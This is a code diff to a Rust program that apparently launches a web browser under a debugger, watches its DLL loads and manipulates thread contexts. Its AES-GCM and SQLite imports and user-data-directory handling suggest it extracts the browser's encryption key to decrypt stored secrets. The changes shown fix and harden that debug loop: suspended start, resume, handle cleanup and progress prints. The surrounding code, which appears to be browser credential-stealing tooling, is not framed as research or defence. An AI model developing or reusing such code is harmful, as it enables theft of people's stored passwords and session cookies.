@@ -11,7 +11,7 @@ use std::ptr::{null, null_mut};
 use std::mem::{size_of, zeroed};
 use std::path::{Path, PathBuf};
 use std::fs;
-use std::io::Write;
+use std::io::{stdout, Write};
 use aes_gcm::{Aes256Gcm, Key, Nonce, KeyInit, aead::Aead};
 use rusqlite::{Connection};
 use chrono::{Utc};
@@ -270,6 +270,8 @@ extern "system" {
     ) -> BOOL;
     pub fn GetThreadContext(hthread: HANDLE, lpcontext: *mut CONTEXT) -> BOOL;
     pub fn SetThreadContext(hthread: HANDLE, lpcontext: *const CONTEXT) -> BOOL;
+    pub fn ResumeThread(hthread: HANDLE) -> u32;
+    pub fn CloseHandle(hobject: HANDLE) -> BOOL;
 }
 
 fn main() {
@@ -354,7 +356,7 @@ fn main() {
                 null(),
                 null(),
                 FALSE,
-                DEBUG_ONLY_THIS_PROCESS | CREATE_NEW_CONSOLE,
+                DEBUG_ONLY_THIS_PROCESS | CREATE_NEW_CONSOLE | CREATE_SUSPENDED,
                 null(),
                 null(),
                 &si,
@@ -367,7 +369,9 @@ fn main() {
             }
 
             println!("Started {} with PID: {}", config.name, pi.dwProcessId);
+            let _ = stdout().flush();
 
+            ResumeThread(pi.hThread);
             debug_loop(pi.hProcess, &config, &user_data_dir);
 
             CloseHandle(pi.hProcess);
@@ -381,14 +385,27 @@ unsafe fn debug_loop(h_process: HANDLE, config: &BrowserConfig, user_data_dir: &
     let mut _dll_base: *mut std::ffi::c_void = null_mut();
     let mut target_address: usize = 0;
 
+    println!("Entering debug loop...");
+    let _ = stdout().flush();
+
     loop {
         if WaitForDebugEvent(&mut debug_event, INFINITE) == 0 {
             break;
         }
 
         match debug_event.dwDebugEventCode {
+            CREATE_PROCESS_DEBUG_EVENT => {
+                println!("Received CREATE_PROCESS_DEBUG_EVENT");
+                let _ = stdout().flush();
+                let create_process = debug_event.u.CreateProcessInfo;
+                if create_process.hFile != 0 {
+                    CloseHandle(create_process.hFile);
+                }
+            }
             LOAD_DLL_DEBUG_EVENT => {
                 let load_dll = debug_event.u.LoadDll;
+                println!("Received LOAD_DLL_DEBUG_EVENT: {:?}", load_dll.lpBaseOfDll);
+                let _ = stdout().flush();
                 let mut buffer = [0u16; 260];
                 let len = GetFinalPathNameByHandleW(load_dll.hFile, buffer.as_mut_ptr(), buffer.len() as u32, 0);
                 if len > 0 {
@@ -405,6 +422,9 @@ unsafe fn debug_loop(h_process: HANDLE, config: &BrowserConfig, user_data_dir: &
                             }
                         }
                     }
+                }
+                if load_dll.hFile != 0 {
+                    CloseHandle(load_dll.hFile);
                 }
             }
             CREATE_THREAD_DEBUG_EVENT => {
